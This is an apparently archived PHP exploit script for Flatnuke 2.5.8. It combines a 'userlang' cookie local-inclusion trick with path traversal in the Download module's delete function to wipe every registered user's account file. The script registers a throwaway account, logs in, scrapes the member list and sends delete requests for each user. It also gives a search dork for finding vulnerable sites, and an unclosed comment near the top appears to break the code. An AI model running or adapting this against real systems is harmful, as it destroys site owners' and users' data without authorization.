#!/usr/bin/php -q -d short_open_tag=on
<?
print_r('
-----------------------------------------------------------------------------
Flatnuke 2.5.8 "userlang" arbitrary local inclusion/delete all users exploit
by rgod rgod@autistici.org
site: http://retrogod.altervista.org
dork: "FlatNuke" "Valid HTML 4.01!" "Valid CSS!" "Get RSS 2.0 Feed" "Get RSS
      2.0 Feed" inurl:/forum/ +AND +OR
-----------------------------------------------------------------------------
');
/*
works regardless of php.ini settings

if ($argc<3) {
print_r('
-----------------------------------------------------------------------------
Usage: php '.$argv[0].' host path OPTIONS
host:      target server (ip/hostname)
path:      path to flatnuke
Options:
 -p[port]:    specify a port other than 80
 -P[ip:port]: specify a proxy
Example:
php '.$argv[0].' 2.2.2.2 /flatnuke/-P1.1.1.1:80
php '.$argv[0].' 1.1.1.1 /-p81
-----------------------------------------------------------------------------
');
die;
}

error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout",5);

function quick_dump($string)
{
  $result='';$exa='';$cont=0;
  for ($i=0; $i<=strlen($string)-1; $i++)
  {
   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
   {$result.="  .";}
   else
   {$result.="  ".$string[$i];}
   if (strlen(dechex(ord($string[$i])))==2)
   {$exa.=" ".dechex(ord($string[$i]));}
   else
   {$exa.=" 0".dechex(ord($string[$i]));}
   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
  }
 return $exa."\r\n".$result;
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
function sendpacketii($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.$host.':'.$port; die;
    }
  }
  else {
	$c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$proxy);
    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
	}
  }
  fputs($ock,$packet);
  if ($proxy=='') {
    $html='';
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
  #debug
  #echo "\r\n".$html;
}
function make_seed()
{
   list($usec, $sec) = explode(' ', microtime());
   return (float) $sec + ((float) $usec * 100000);
}

$host=$argv[1];
$path=$argv[2];
$port=80;
$proxy="";
for ($i=3; $i<$argc; $i++){
$temp=$argv[$i][0].$argv[$i][1];
if ($temp=="-p")
{
  $port=str_replace("-p","",$argv[$i]);
}
if ($temp=="-P")
{
  $proxy=str_replace("-P","",$argv[$i]);
}
}
if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}

//check for fd+.php existence, be sure this is 2.5.8
$packet ="GET ".$p."download/fd+.php HTTP/1.0\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n\r\n";
sendpacketii($packet);
$temp=explode("\n",$html);
if (eregi("404 Not Found",$temp[0]))
{die("wrong Flatnuke version...");}

srand(make_seed());
$v = rand(1,9999);
$username="suntzoi".$v;

//register
$data="op=reg&nome=".$username;
$data.="&regpass=suntzu";
$data.="&reregpass=suntzu";
$data.="&anag=suntzu";
$data.="&email=suntzu@fake.fke";
$data.="&homep=".urlencode('http://www.asite.com');
$data.="&prof=PUNK";
$data.="&prov=whereimfrom";
$data.="&ava=clanbomber.png";
$data.="&url_avatar=";
$data.="&firma=";
$packet="POST ".$p."forum/index.php HTTP/1.1\r\n";
$packet.="Accept-Encoding: text/plain\r\n";
$packet.="Content-Type: application/x-www-form-urlencoded\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Content-Length: ".strlen($data)."\r\n";
$packet.="Connection: Close\r\n\r\n";
$packet.=$data;
sendpacketii($packet);
echo $username."\r\n";

//Login... (to see memberlist)
$data="op=login&nome=".$username."&logpassword=suntzu";
$packet="POST ".$p."forum/index.php HTTP/1.1\r\n";
$packet.="Content-Type: application/x-www-form-urlencoded\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Content-Length: ".strlen($data)."\r\n";
$packet.="Connection: Close\r\n\r\n";
$packet.=$data;
sendpacketii($packet);
$temp=explode("Set-Cookie: ",$html);
$temp2=explode(' ',$temp[1]);
$cookie=$temp2[0];
$temp2=explode(' ',$temp[2]);
$cookie.=" ".$temp2[0];
echo "cookie -> ".$cookie."\r\n";

//Retrieve usernames...
$users=array();
$i=0;
do {
$i++;
$f=false;
$packet="GET ".$p."forum/index.php?op=members&page=".$i." HTTP/1.1\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Cookie: ".$cookie."\r\n";
$packet.="Connection: Close\r\n\r\n";
sendpacketii($packet);
$temp=explode("index.php?op=profile&amp;user=",$html);
for ($kk=1; $kk<count($temp); $kk++)
{
$temp[$kk]=str_replace("\"","",$temp[$kk]);
$temp2=explode(">",$temp[$kk]);
if (($temp2[0]<>"") and ($temp2[0]<>$username)){$f=true;}
if ($temp2[0]<>"") {
if (!in_array($temp2[0],$users))
{
$users=array_merge($users,trim($temp2[0]));
}
}
}
} while ($f==true);

//delete all users...
for ($i=0; $i<count($users); $i++)
{
echo "deleting -> ".$users[$i]."\r\n";
$data='-----------------------------7d626f251b00fa
Content-Disposition: form-data; name="canc";

1
-----------------------------7d626f251b00fa
Content-Disposition: form-data; name="file_da_canc";

../../forum/users/'.$users[$i].'.php
-----------------------------7d626f251b00fa--
';
$packet ="POST ".$p."index.php?mod=Download HTTP/1.0\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Content-Type: multipart/form-data; boundary=---------------------------7d626f251b00fa\r\n";
$packet.="Content-Length: ".strlen($data)."\r\n";
$packet.="Accept: text/plain\r\n";
$packet.="Cookie: userlang=../sections/none_Sondaggio/Vecchi_sondaggi/section;\r\n";
$packet.="Connection: Close\r\n\r\n";
$packet.=$data;
sendpacketii($packet);
}
?>

# milw0rm.com [2006-10-10]